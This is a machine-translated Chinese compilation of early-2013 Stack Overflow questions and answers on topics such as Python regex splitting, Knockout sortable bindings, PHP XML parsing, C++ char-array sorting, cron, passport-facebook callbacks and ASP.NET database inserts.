> 赞同：3
> 
> 时间：2013-01-01T16:25:01.210

PDF 不是轻量级格式。它基本上是在顶部压缩的附言。现有的库*绝对*是您想要使用的，而不是自己编写的。这是一项艰巨的任务。

或者获取现有的 PDF 编写器应用程序，并从您的程序中启动它。

我没有看太多，但是[libgnupdf](http://www.gnupdf.org/)看起来还可以。

根据[维基百科](http://en.wikipedia.org/wiki/Portable_Document_Format)， PDF 结合了三种技术：

> *   PostScript 页面描述编程语言的子集，用于生成布局和图形。
> *   字体嵌入/替换系统，允许字体与文档一起移动。
> *   一个结构化的存储系统，将这些元素和任何相关内容捆绑到一个文件中，并在适当的地方进行数据压缩。

# python - Python 正则表达式命名组

> ID：14111837
> 
> 赞同：0
> 
> 时间：2013-01-01T15:55:34.663
> 
> 标签：python, regex

我目前正在尝试解决拆分以下字符串的问题

```
[@x arg-xa, arg. xb, arg xc @y arg-ya, arg. yb, arg yc @z arg-za, arg. zb, arg zc] 
```

进入某种结构化的 dict 对象。类似以下列表的结果将不胜感激：

```
[
    {
        'command': 'x',
        'args': ['arg-xa', 'arg. xb', 'arg xc']
    },
    {
        'command': 'y',
        'args': ['arg-ya', 'arg. yb', 'arg yc']
    }
    {
        'command': 'z',
        'args': ['arg-za', 'arg. zb', 'arg zc']
    }
] 
```

该命令以“@”符号为前缀，该命令的以下参数由“，”符号分隔。用 string.split('@') 分割字符串和一些循环会起作用，但我想知道是否可以用一个正则表达式来解决这个问题。

也许一些正则表达式大师会这么好心，给我看光！

一如既往，非常感谢。（我使用了搜索，但没有找到解决此类问题的方法）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:00:07.580

我只是使用`.split()`并切断字符串：

```
import string

s = '@x arg-xa, arg. xb, arg xc @y arg-ya, arg. yb, arg yc @z arg-za, arg. zb, arg zc'

result = []

for part in s.split('@')[1:]:  # `[1:]` skips the first (empty) element
    command, _, arguments = part.partition(' ')

    result.append({
        'command': command,
        'args': map(string.strip, arguments.split(', '))
    }) 
```

# javascript - 由 Knockout JS 支持的 Accordion 内的 JQuery UI Sortable 的困难

> ID：14111838
> 
> 赞同：1
> 
> 时间：2013-01-01T15:55:53.173
> 
> 标签：javascript, jquery, jquery-ui, knockout.js

有关我正在尝试构建的 UI，请参阅[此处](http://jsfiddle.net/x5ZtX/4/)的 jsFiddle 链接。首先，用户选择一个会议。所选会议的活动显示在手风琴中，每个活动都有表，这些表在手风琴内显示为纯 html 表。用户应该能够拖放表格并自定义其排序顺序。所有这一切都得到了 Knockout JS 的支持，到目前为止效果很好，但我遇到了障碍......

我遇到的第一个问题是“数据绑定”手风琴。[我实现了在此处](https://groups.google.com/forum/?fromgroups=#!topic/knockoutjs/GEcJ8Pvgbjg)找到的自定义绑定处理程序解决方案，这似乎工作得很好。但是，我似乎无法可靠地连接表记录的可排序功能。

我不能简单地调用`$(".sortable tbody").sortable();`. `$(document).ready(function(){});`尽管这适用于第一次会议，但一旦 SelectedConference 更改，可排序功能就会丢失。我可以将它添加到 Accordion 的自定义活页夹的更新功能中：

```
update: function (element, valueAccessor) {

            var options = valueAccessor();
            $(element).accordion("destroy")
            $(element).accordion({ active: "h3:last", collapsible: true });

            //TODO: add sortable call here
        } 
```

这似乎可行，但我是自定义活页夹的新手。这是低效的吗？有没有更好的方法来实现可排序功能？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:36:38.147

不要担心[自定义绑定处理程序](http://www.knockmeout.net/2011/07/another-look-at-custom-bindings-for.html)，它们是放置这种逻辑的正确位置。

但是我建议您应该仅为可排序逻辑创建一个新的自定义绑定，因为它与您的手风琴无关：

```
ko.bindingHandlers.sortable = {
    init: function (element, valueAccessor) {
        var options = valueAccessor() || {};
        $(element).sortable(options);
    }
} 
```

然后你可以在你的 html 中使用它：

```
<tbody data-bind="foreach: Tables, sortable: {}"> 
```

演示[JSFiddle](http://jsfiddle.net/KYKAP/2/)。

# php - 如何用php解析xml？

> ID：14111840
> 
> 赞同：-4
> 
> 时间：2013-01-01T15:55:55.223
> 
> 标签：php, xml, xml-parsing

> **可能重复： PHP 的**
> [最佳 XML 解析器](https://stackoverflow.com/questions/188414/best-xml-parser-for-php)
> [如何使用 php 解析 XML 文件](https://stackoverflow.com/questions/8775669/how-to-parse-xml-file-using-php)

我无法解析这个 xml...真正的 xml 在[这里](http://www.koeri.boun.edu.tr/sismo/zeqmap/xmlt/son24saat.xml)

```
 <?xml version="1.0" encoding="ISO-8859-1" ?>
<eqlist>
    <earhquake  name="2012.12.31 18:35:13"  lokasyon="CAMONU-AKHISAR (MANİSA)                           İlksel" lat="38.9572"   lng="27.8965"   mag="2.9" Depth="5.0" />
    <earhquake  name="2012.12.31 18:54:09"  lokasyon="VAN GÖLÜ                                          İlksel" lat="38.7273"   lng="43.1598"   mag="2.3" Depth="2.1" />
    <earhquake  name="2012.12.31 21:00:49"  lokasyon="KUCUKESENCE-ERENLER (SAKARYA)                     İlksel" lat="40.7347"   lng="30.4742"   mag="1.9" Depth="4.4" />
</eqlist> 
```

我该如何解析它？问题来自运行不错的远程站点的谷歌地图应用程序的 xml 文件的前两个字符。看看那个数组

```
[0] => ÿþ<?xml version="1.0" encoding="ISO-8859-1" ?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T15:58:20.730

您可以使用 SimpleXML_Load_String。

```
<?php // RAY_temp_burhan.php
error_reporting(E_ALL);
echo '<pre>';

$xml = <<<ENDXML
<?xml version="1.0" encoding="ISO-8859-1" ?>
<eqlist>
    <earhquake  name="2012.12.31 18:35:13"  lokasyon="CAMONU-AKHISAR (MANISA)                           Ilksel" lat="38.9572"   lng="27.8965"   mag="2.9" Depth="5.0" />
    <earhquake  name="2012.12.31 18:54:09"  lokasyon="VAN GÖLÜ                                          Ilksel" lat="38.7273"   lng="43.1598"   mag="2.3" Depth="2.1" />
    <earhquake  name="2012.12.31 21:00:49"  lokasyon="KUCUKESENCE-ERENLER (SAKARYA)                     Ilksel" lat="40.7347"   lng="30.4742"   mag="1.9" Depth="4.4" />
</eqlist>
ENDXML;

// CONVERT TO AN OBJECT
$obj = SimpleXML_Load_String($xml);

// PARSE OUT SOME ATTRIBUTES
foreach ($obj as $quake)
{
    // ATTRIBUTE NAMES ARE CASE-SENSITIVE
    $loc = $quake->attributes()->lokasyon;
    $dep = $quake->attributes()->Depth;
    echo PHP_EOL . "$loc $dep";
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T16:13:11.030

面向对象的方式

```
$xml = <<<ENDXML
<?xml version="1.0" encoding="ISO-8859-1" ?>
<eqlist>
    <earhquake  name="2012.12.31 18:35:13" 
                lokasyon="CAMONU-AKHISAR (MANISA) Ilksel"
                lat="38.9572"
                lng="27.8965"   mag="2.9" Depth="5.0" />
    <!-- Etc... -->
</eqlist>
ENDXML;

$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOBLANKS); 
```

然后您可以使用[DOMDocument](http://php.net/manual/en/class.domdocument.php)定义的各种方法。用于检查 XSD 有效性的方法之一是`schemaValidate`

# c++ - 对 char 数组使用“排序”（C++）

> ID：14111841
> 
> 赞同：8
> 
> 时间：2013-01-01T15:56:04.660
> 
> 标签：c++, arrays, sorting

是否可以使用`std::sort`内部定义的方式根据 ASCII 值对数组`<algorithm>`进行排序？`char`如果是，请举例说明。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-01T15:57:36.683

是的。这绝对是可能的。您只需编写一些示例代码就可以知道这一点，例如：

```
char charArray[] = {'A','Z', 'K', 'L' };

size_t arraySize = sizeof(charArray)/sizeof(*charArray);

std::sort(charArray, charArray+arraySize);

//print charArray : it will print all chars in ascending order. 
```

顺便说一句，您应该**避免**使用 c 样式的数组，并且应该更喜欢使用`std::array`or `std::vector`。

`std::array`当您在编译时知道大小时`std::vector`使用，而当您需要在运行时知道其大小的动态数组时使用。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-01T15:59:20.123

是的：

```
char array[] = "zabgqkzg";

std::sort(array, array+sizeof(array)); 
```

有关工作演示，请参阅[http://ideone.com/0TkfDn 。](http://ideone.com/0TkfDn)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-01T16:04:08.850

当然，正确的方法是使用`std::begin()`and `std::end()`：

```
std::sort(std::begin(array), std::end(array)); 
```

如果你没有 C++ 2011 编译器，你可以实现相应`begin()`的和`end()`函数，例如：

```
template <typename T, int Size>
T* end(T (&array)[Size]) {
    return array + Size;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-07-07T06:58:08.927

我只是使用它并为我回答。

```
char name[9] = "zxcda";
int length = 0;
for(int i=0;name[i]!='\0';i++)
    length++;
sort(name , name+length);
cout << name; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-10-14T13:58:34.187

使用的答案`sizeof(charArray)`假定数组必须完全填充。当使用部分填充的数组运行时，它们会产生垃圾结果。

在这种情况下使用：

```
sort(str, str + strlen(str)); 
```

# python - 使用带有 cron 的 python 脚本

> ID：14111844
> 
> 赞同：2
> 
> 时间：2013-01-01T15:56:21.183
> 
> 标签：python, cron

`#!/usr/bin/python`我在第一行有一个 python 脚本。我可以从 CLI 运行它`python myScp.py.`

但作为 cron 脚本的一部分。python 脚本无法运行。cron 已经过测试，运行 python 脚本并可以写入 /tmp/crontest.txt

好像是目录问题。我测试了`os.getcwd().`它是正确的......只是当cron运行脚本时它会抛出一个错误。从 CLI 运行：`/usr/bin/python myScp.py`抛出相同的错误。

```
Traceback (most recent call last):
  File "/myScp.py", line 31, in <module>
    execfile(dn2 + 'anotherScpt.py')
IOError: [Errno 2] No such file or directory: './anotherScpt.py' 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-01T16:02:56.950

我们首选的方法是在 crontab 条目中明确指定工作目录：

```
0 0  * * * cd /my/project; /opt/python-2.7/bin/python bin/myscript.py 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T16:03:14.077

鉴于该错误，您的问题是您依赖位于特定目录中的程序来执行另一个文件。

当您在它所在的目录中运行程序时，它可以找到该文件 - 当您（或 cron）在该目录之外运行它时，它找不到该文件。您需要将文件放在脚本可以找到的位置，使用绝对路径，或者在程序中找到脚本的位置。

# macos - 核心数据预取和 KVO 合规性

> ID：14111848
> 
> 赞同：3
> 
> 时间：2013-01-01T15:56:51.893
> 
> 标签：macos, cocoa, core-data

如果我尝试在 Core Data 中预取相关实体，则会引发 KVO 异常。这对我来说没有任何意义，我似乎无法在简化项目中复制这种行为。我的目标是 10.8 并使用 ARC。

我的数据为音乐库建模，我有三个感兴趣的实体：`Track`、`Artist`和`Album`。曲目有一个艺术家和一个专辑，而专辑有一个艺术家。我的`Album`和`Artist`对象的名称是唯一的（商店中只有一位具有给定名称的艺术家）。

我想显示包含以下字段的曲目列表：标题、艺术家姓名、专辑标题。这很容易使用 NSArrayController 来实现`Track`实体和 NSTableView 中的绑定。

但是，由于我知道我将使用艺术家和专辑关系，所以我想在加载曲目时预取它们。我使用自定义 performFetch: 方法创建了一个 NSArrayController 子类，如下所示：

```
- (BOOL) fetchWithRequest:(NSFetchRequest *)fetchRequest merge:(BOOL)merge error:(NSError *__autoreleasing *)error
{
    NSEntityDescription *entityDescription = [Track entityInManagedObjectContext:[self managedObjectContext]];
    fetchRequest = [[NSFetchRequest alloc] init];
    [fetchRequest setEntity:entityDescription];
    [fetchRequest setRelationshipKeyPathsForPrefetching:@[@"album", @"artist"]];

    return [super fetchWithRequest:fetchRequest merge:merge error:error];
} 
```

我将 IB 中的 NSArrayController 的类设置为我的子类，并且我预计 UI 滞后会消失（每次滚动都会触发故障）。但是，抛出异常：

> 2013-01-01 10:48:06.965 XXX[10593:303] 无法为观察者更新关键路径“artist.name” from ，很可能是因为在没有适当的 KVO 通知的情况下，关键“艺术家”的值已更改发送。检查 Track 类的 KVO 合规性。

在自定义`NSArrayController`子类之前一切正常。通过简单地注释掉`setRelationshipKeyPathsForPrefetching`我的`NSArrayController`子类中的行，一切都会再次起作用。我无法确定预取和 KVO 之间的联系是什么。以前有没有 Core Data 专家见过这样的事情？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-21T18:04:37.033

我遇到了基本相同的问题，这是我在解决它时学到的：

似乎 NSArrayController`setRelationshipKeyPathsForPrefetching:`在所有情况下都不能很好地发挥作用。我在子上下文中执行预取请求，这最终破坏`NSArrayController`了父上下文中的 KVC，我认为这是意外行为。无论如何，我修复它的方法是使用[“旧”样式（10.4） prefetching](https://developer.apple.com/library/mac/documentation/Cocoa/Conceptual/CoreData/Articles/cdPerformance.html#//apple_ref/doc/uid/TP40003468-SW6)，它看起来像......

```
NSFetchRequest *trackReq = [[NSFetchRequest alloc] initWithEntityName:@"Track"];
NSArray *fetchedTracks = [context executeFetchRequest:trackReq error:&error];

NSFetchRequest *batchFaultReq = [[NSFetchRequest alloc] initWithEntityName:@"Artist"];
[batchFaultReq setPredicate:[NSPredicate predicateWithFormat:@"SELF.tracks in %@", fetchedTracks];
NSArray *faultedItems = [context executeFetchRequest:batchFaultReq error:&error];

// do something with fetchedTracks 
```

...如何将其插入`NSArrayController`子类是另一回事-我不清楚如何在`fetchWithRequest:`覆盖中使用此方法，因为在执行批处理故障请求之前需要获取的结果。顺便说一句，您是否尝试过惰性获取标志？

# node.js - passport-facebook：如何动态设置回调 URL？

> ID：14111850
> 
> 赞同：17
> 
> 时间：2013-01-01T15:57:01.053
> 
> 标签：node.js, express, passport.js

我正在按照此示例设置 FacebookStrategy - [https://github.com/jaredhanson/passport-facebook/blob/master/examples/login/app.js](https://github.com/jaredhanson/passport-facebook/blob/master/examples/login/app.js)

我想动态设置callbackURL，即：用户访问/posts/34，所以回调将是/posts/34/callback

我怎样才能实现这样的目标？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-02T09:01:02.557

我找到了解决方案，身份验证重定向路由和回调路由都应该用函数（req，res，next）包装passport.authenticate（）。

我按照[http://passportjs.org/guide/authenticate/](http://passportjs.org/guide/authenticate/)中的示例进行自定义回调

以及[https://github.com/jaredhanson/passport-facebook/issues/2](https://github.com/jaredhanson/passport-facebook/issues/2)中关于自定义回调 URL的评论

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2016-10-12T15:14:41.870

我使用这个解决方案，这很容易。我将最后一个 url 保存在会话中，然后收集它。如果您将回调 url 直接传递给 fb，则需要允许所有不同的路由，这很麻烦。

```
 app.get '/auth/facebook/', routesService.clean, (req, res, next) ->
    req.session.redirect = req.query.redirect if req.session? && req.query.redirect?
    passport.authenticate('facebook', { scope: ['user_friends'] }) req, res, next
    return

  app.get '/auth/facebook/callback', passport.authenticate('facebook', failureRedirect: '/login'), (req, res) ->
        # Successful authentication, redirect home.
        if req.session?.redirect?
          rediredUrl = req.session.redirect
          delete req.session.redirect
          res.redirect '/#!'+ rediredUrl
        else
          res.redirect '/'
        return 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-04-26T15:17:54.993

只是跟进 Gal 的回答，这是综合解决方案：

```
app.get('/auth/facebook', (req, res, next) => {
  passport.authenticate('facebook')(req, res, next)
})

app.get("/auth/facebook/callback", (req, res, next) => {
  passport.authenticate('facebook', (err, user, info) => {
    if (err) { return next(err); }
    if (!user) { return res.redirect('/login')}
    req.logIn(user, function(err) {
      if (err) { return next(err); }
      return res.redirect('/users/' + user.uid)
    });
  })(req, res, next)
}) 
```

请注意，您必须专门登录用户。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-01-08T09:27:53.737

使用[护照 js](http://www.passportjs.org/)，您可以设置`successReturnToOrRedirect`

```
router.get('/facebook/callback', (req, res, next) =>
    passport.authenticate('facebook', {
        callbackURL: `https://${req.get('host')}/api/auth/facebook/callback`,
        successReturnToOrRedirect: req.session.redirect || '/',
        failureRedirect: '/',
        successRedirect: '/',
    })(req, res, next)
); 
```

# version-control - 是否有针对不在单个目录下的随机文件的版本控制系统？

> ID：14111852
> 
> 赞同：2
> 
> 时间：2013-01-01T15:57:12.987
> 
> 标签：version-control

我想对我的 linux 脚本和设置进行版本控制。我有一个我关心的文件和目录的列表，它们遍布整个文件系统。我不想跟踪我的主目录，因为我不想跟踪很多文件，并且它包含指向外部位置的符号链接。是否有版本控制系统可以跟踪版本控制根目录外部位置中的指定文件？

**更新：**我发现“git config core.worktree /”会跟踪 / 下的所有内容，尽管 repo 中的文件位置被强制为不包括符号链接的规范路径，因此它并不适合。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:30:10.813

一个常见的解决方案是将存储库分开，并使用类似“安装”的系统将更新的文件部署到它们各自的系统位置。

# jquery - 使用 BasicHttpbinding 跨域 JQuery Ajax 调用 WCF 服务

> ID：14111853
> 
> 赞同：0
> 
> 时间：2013-01-01T15:57:21.107
> 
> 标签：jquery

我有一个带有“BasicHttpbinding”绑定的 WCF 服务。我可以在 Internet Explorer 中使用 JQuery 优雅地调用该服务。但是相同的代码在 Chrome 或 FireFox 中不起作用。我可以理解来自 Chrome 或 FireFox 的 JQuery Ajax 调用存在跨域问题。我知道我可以使用 crossDomainScriptAccessEnabled="true" 公开“webHttpBinding”绑定并调用该服务。但是如果有一个scanario，我必须使用现有的“BasicHttp”绑定，那么解决方案是什么？我使用以下 JQuery 代码调用了 WCF 服务：

```
 $.ajax({
                  type: "POST",
                  url: "http://localhost:1415/MyService.svc/bh/",
                  data: bhRequest,
                  timeout: 10000,
                  contentType: "text/xml",
                  dataType: "xml",
                  beforeSend: function (xhr) {
                      xhr.setRequestHeader("SOAPAction", "http://tempuri.org/IMyService/GetData");
                  },
                  success: function (data) {
                      $(data).find("GetDataResponse").each(function () {
                          alert($(this).find("GetDataResult").text());
                      });
                  },
                  error: function (xhr, status, error) {
                      alert(error);

                  }
              }); 
```

我的 WCF 服务方法如下：

```
 [OperationContract]
 string GetData(int value); 
```

有人可以为此提供任何解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-28T17:44:26.273

将 global.asax 添加到您的 WCF，然后添加：

```
protected void Application_BeginRequest(object sender, EventArgs e)
{
    HttpContext.Current.Response.AddHeader("Access-Control-Allow-Origin","*");
} 
```

# qt - DirectX 之上的透明 Qt 窗口

> ID：14111855
> 
> 赞同：5
> 
> 时间：2013-01-01T15:57:31.443
> 
> 标签：qt, user-interface, directx, transparency, hud

**我想制作一个透明的无框 QWidget，它看起来像是在另一个 QWidget 之上呈现的。**

我的意图是使用**DirectX**和**Qt**在 3D 游戏之上创建一个**HUD**。

 ****到目前为止，在我的努力中，我的 QMainWindow 包含一个定制的 DirectX-Widget，它是通过在 DirectX 中创建交换链时将普通 QWidget 的 HWND 交给 DirectX 创建的，然后使用 QTimer 创建自定义渲染循环（*参见代码下面*）。

然后我尝试在 QMainWindow 顶部渲染一个新的**Overlay** -widget（我的预期 HUD），并使其看起来像是主窗口的一部分。

**通过在叠加层上使用以下标志，我可以使其行为与我想要的相似，但我仍然无法摆脱框架。**

```
setWindowFlags(Qt::WindowStaysOnBottomHint);
setAttribute(Qt::WA_TranslucentBackground, true);
setAttribute(Qt::WA_TransparentForMouseEvents); 
```

**左图**显示了它的真实外观，通过 MS Paint 的魔力，**右图**是我想要的样子。

![调试图像](../Images/5f5e683cf333acb80fca5429d1d4b177.png)

正如您从图片中看到的那样，透明度在 DirectX 小部件之上不起作用，但它似乎在普通小部件（如**工具****栏**）之上工作，当我尝试使用 QPainter 之类的东西时似乎也是如此而不是 DirectX。

*有谁知道为什么会这样？有关如何摆脱 DirectX 中的框架或实现类似功能的任何建议？*

* * *

**源代码**

您可以从[此处下载完整的](https://dl.dropbox.com/u/12273871/%28Program%29/Qt%20DirectX%20transperancy%20problem.zip)**Visual Studio 2010**项目。

*如果您想自己编译，可能需要**用于 Qt4 的 Visual Studio 插件 1.1.11**和**2010 年 6 月的 DirectX SDK 。***

大部分源代码也如下所示。我试图让它尽可能短。

```
#pragma once

#include <QtGui/QMainWindow>
#include <QtCore/QTimer>
#include "ui_mainwindow.h"
#include "ui_overlay.h"

class DXWidget : public QWidget
{
    Q_OBJECT
private:
    QTimer* timer;
public:
    DXWidget(QWidget* parent) : QWidget(parent){}
    ~DXWidget()
    {
        // dx cleanup
    };
    void init(HWND windowHandle)
    {
        // init DirectX using our HWND as render target
        initDX(windowHandle);

        // start render loop
        timer = new QTimer(this);
        connect(timer, SIGNAL(timeout()), this, SLOT(render()));
        timer->start(0);
    }
private:
    void initDX(HWND windowHandle)
    {
        // inits DirectX stuff
    }
private slots:
    void render()
    {
        // renders a frame to the Widget using DirectX
    }
};

class Overlay : public QMainWindow
{
    Q_OBJECT
private:
    Ui::Overlay ui;
public:
    Overlay(QWidget* parent) : QMainWindow(parent)
    {
        ui.setupUi(this);
        QWidget::setWindowFlags(Qt::WindowStaysOnBottomHint);
        QWidget::setAttribute(Qt::WA_TranslucentBackground, true);
        show();
        move(6, 50); // move window so we can see it overlapping our toolbar
    };
    ~Overlay()
    {
    };
};

class MainWindow : public QMainWindow
{
    Q_OBJECT
private:
    Ui::MainWindowClass ui;
    DXWidget* widget;
public:
    MainWindow()
    {
        // setup window
        ui.setupUi(this);

        // create DirectX-widget
        widget = new DXWidget(this);
        MainWindow::setCentralWidget(widget);

        // hand HWND to DirectXs swap chain so
        // we can draw to that window
        widget->init(widget->winId());

        // create overlay
        new Overlay(this);
    };
}; 
```****

# c# - 插入具有下拉列表条件的数据

> ID：14111857
> 
> 赞同：0
> 
> 时间：2013-01-01T15:57:51.600
> 
> 标签：c#, asp.net, drop-down-menu

我有具有下拉列表的asp.net 项目。我需要根据下拉列表条件将数据插入我的数据库。

例如; 在我的项目中，我将选择员工并从我的文本框中插入一些值，然后单击底部的按钮后，我需要将更改插入从下拉列表中选择员工的数据库中。

这是按钮点击代码；

```
protected void Button2_Click(object sender, EventArgs e)
{
    SqlConnection conn;
    SqlCommand cmd = new SqlCommand();
    string strSQL = "UPDATE info (empid,day1,day2,date1) Values (@empid,@day1,@day2,@date1)";
    string bag_str = WebConfigurationManager.ConnectionStrings["asgdb01ConnectionString"].ConnectionString;
    conn = new SqlConnection(bag_str);
    conn.Open();
    cmd.Connection = conn;
    cmd.CommandText = strSQL;
    cmd.Parameters.Add(new SqlParameter("@day1", Int32.Parse(DropDownList1.SelectedItem.Value)));
    cmd.Parameters.Add(new SqlParameter("@day1", Int32.Parse(TextBox1.Text)));
    cmd.Parameters.Add(new SqlParameter("@day2", Int32.Parse(TextBox2.Text)));
    cmd.Parameters.Add(new SqlParameter("@date1", CalendarExtender1.SelectedDate));
    int i = cmd.ExecuteNonQuery();
    conn.Close();
    if (i > 0)
        Response.Write("Data Inserted");
    else
        Response.Write("Try Again");

} 
```

这里有一些事情要让你清楚；

|下拉列表1| （我会点击这里，名字会出现你知道的。）

-麦克风

-约翰

-苏珊

-凯文

(label1) DAY1 : ***_* __ *_* __** (TEXTBOX1)

(label2) DAY2: ***_* __ *_* __** (TEXTBOX2)

|完成| （按钮 1）

您从这里看到，我将单击下拉列表，然后我将选择员工。在我输入值后，我将单击“完成”按钮，数据将被插入到该选定的员工中。

这是关键问题；我如何告诉 button_click 事件；您将这些数据插入到我从下拉列表中选择员工的选定员工表中。好的 ？

我试图在这里制作表格样本；

ID NAME TYPE MON TUE .... SUN TOTAL DAY1 DAY2 DATE

* * *

1 迈克出 250 350 ..... 0 900 - - 22-06-2012

2 约翰在 350 150 .... 100 1100 - - 28-06-2012

正如您从这里看到的，我的朋友，我将从我的 datetimepickers 中选择日期，我将从我的下拉列表中选择员工，然后将值输入到文本框中，然后单击完成按钮。

day1,day2 值必须插入到所选员工中。

请等待你的回答，我太需要它了..

谢谢。

四眼等待您的帮助。谢谢。

你明白我的意思吗我的朋友们？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:28:13.130

您可以通过获取下拉列表的选定值将选定的员工值插入数据库。

```
int empID = Convert.ToInt32(ddlEmployee.SelectedValue);
SqlConnection conn;
SqlCommand cmd = new SqlCommand();
string strSQL = "Insert INTO info (empid, day1,day2) Values (@empid, @day1,@day2)";
string bag_str = WebConfigurationManager.ConnectionStrings["asgdb01ConnectionString"].ConnectionString;
conn = new SqlConnection(bag_str);
conn.Open();
cmd.Connection = conn;
cmd.CommandText = strSQL;
cmd.Parameters.Add(new SqlParameter("@empid", empID));
cmd.Parameters.Add(new SqlParameter("@day1", TextBox1.Text));
cmd.Parameters.Add(new SqlParameter("@day2", TextBox2.Text));

int i = cmd.ExecuteNonQuery();
conn.Close(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T16:05:39.897

如果您没有设置下拉列表的`SelectedValue`，则应将其设置为员工的 id。

然后，修改您的函数以同时考虑下拉列表中的值，如下所示：

```
protected void Button2_Click(object sender, EventArgs e)
{
    SqlConnection conn;
    SqlCommand cmd = new SqlCommand();
    string strSQL = "Insert INTO info (id, day1,day2) Values (@id, @day1,@day2)";
    string bag_str = WebConfigurationManager.ConnectionStrings["asgdb01ConnectionString"].ConnectionString;
    conn = new SqlConnection(bag_str);
    conn.Open();
    cmd.Connection = conn;
    cmd.CommandText = strSQL;
    cmd.Parameters.Add(new SqlParameter("@id", Int32.Parse(DropDownList1.SelectedValue)));
    cmd.Parameters.Add(new SqlParameter("@day1", TextBox1.Text));
    cmd.Parameters.Add(new SqlParameter("@day2", TextBox2.Text));

    int i = cmd.ExecuteNonQuery();
    conn.Close();
    ....
} 
```

请注意，更改是使用`SelectedValue`DropdownList 的属性来查找正确的 Id

# forms - symfony2 子形式，一对多，仅在不存在时才存在

> ID：14111860
> 
> 赞同：1
> 
> 时间：2013-01-01T15:58:26.247
> 
> 标签：forms, symfony, doctrine, one-to-many, persist

我知道几天前我看到了一个类似问题的答案，但是在没有运气的情况下搜索了 2 个小时后，我又问了。对不起。

我有一个表单 AlertType 调用子表单 StockType 通过

```
->add('stock', new StockType(), array(
            "em" => $em,
        )); 
```

我的 StockType 是

```
 $em = $options['em'];
    $transformer = new TickerToStockTransformer($em);

    $builder
        ->add(
                $builder->create('ticker', 'text')
                //->addModelTransformer($transformer)
                )
        ->add('exchange')
    ; 
```

我的模型变压器看起来像：

```
class TickerToStockTransformer implements DataTransformerInterface
{
/**
 * @var ObjectManager
 */
private $om;

/**
 * @param ObjectManager $om
 */
public function __construct(ObjectManager $om)
{
    $this->om = $om;
}

/**
 * Transforms an object (stock) to an int (id).
 *
 * @param  Stock|null $stock
 * @return integer
 */
public function transform($stock)
{
    if (null === $stock) {
        return "";
    }

    return $stock->getId();
}

/**
 * Transforms an integer (id) to an object (stock).
 *
 * @param  integer $id
 * @return Stock|null
 * @throws TransformationFailedException if object (stock) is not found.
 */
public function reverseTransform($id)
{
    if (!$id) {
        return null;
    }

    $stock = $this->om
        ->getRepository('TSNStatsBundle:Stock')
        ->findOneById($id)
    ;

    if (null === $stock) {
        throw new TransformationFailedException(sprintf(
            'A stock with number "%s" does not exist!',
            $id
        ));
    }

    return $stock;
} 
```

我的控制器非常标准：

```
 $em = $this->getDoctrine()
            ->getEntityManager();
    $guru = $this->getRequest()->request->all();

    $guru =$guru['tsn_statsbundle_alerttype']['guru'];

    $guru = $em->getRepository("TSNStatsBundle:Guru")->find($guru);

    $time = new \DateTime(2012-12-30);
    $time->setTime(23,59);

    $alert  = new Alert();
    $alert->setText($time)
        ->setEmail($time)
        ->setTwitter($time)
        ->setChat($time);
    $request = $this->getRequest();
    $form = $this->createForm(new AlertType(), $alert, array(
            "em" =>$this->getDoctrine()->getEntityManager(),
            'guru' => $guru,
        ));
    $form->bindRequest($request);

    if ($form->isValid()) {
         $em = $this->getDoctrine()
                   ->getEntityManager();
        $em->persist($alert);
        $em->persist($alert->getStock());
        $em->flush();

        return $this->redirect($this->generateUrl('new_alert', array(
                'guru' => 2
            ) ));
    } 
```

我目前没有使用变压器，因为它似乎没用。（我知道它说 FindOneById 并且它在股票代码（文本）上。我也尝试过 byTicker，但它也不起作用）

我与一只能够有许多警报的股票有多对一的关系。

在我尝试在已经存在“库存”的情况下保持“警报”之前，该表单效果很好。如果 Stock 不存在，我如何才能坚持，否则只使用参考？

编辑：好的，所以我破解了我的 isValid 块，所以它可以工作，但它很难看。有没有更好的办法？

```
 if ($form->isValid()) {
         $em = $this->getDoctrine()
                   ->getEntityManager();
         if ($em->getRepository('TSNStatsBundle:Stock')->findOneByTicker($alert->getStock()->getTicker()))
             $alert->setStock($em->getRepository('TSNStatsBundle:Stock')->findOneByTicker($alert->getStock()->getTicker()));

        $em->persist($alert);
        $em->flush();

        return $this->redirect($this->generateUrl('new_alert', array(
                'guru' => 2
            ) ));
    } 
```

# python - 大型 csv 文件中的损坏行

> ID：14111862
> 
> 赞同：0
> 
> 时间：2013-01-01T15:58:32.243
> 
> 标签：python, csv

我正在使用 python 使用 csv 模块将行从 csv 文件提取到列表中。csv 文件相当大，大约 45,000 行，而且似乎有些行已损坏。
使用 python 的 csv.reader 模块时，它只读取大约 1000 行，然后到达损坏的行并停止读取，甚至没有给出错误消息。由于文件非常大，手动更改非常困难。我为第一个损坏的行做了一次，它确实设法再读取了 500 行，然后它显然到达了另一个损坏的行并停止了。我会很高兴了解如何处理这个问题，因为打开文件并编辑它是不可能的，因为它的大小（~500 MB）。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:09:30.817

***如果***可以安全地假设每一行都是一个条目，您可以尝试将文件拆分为大约 500 行的块，一旦您注意到解析的条目数不是行数，您可以检查较小的子集，等等。

例如：

```
for i, line in enumerate(original_file):
    chunk_file.write(line+'\n')
    if i == 500: break 
```

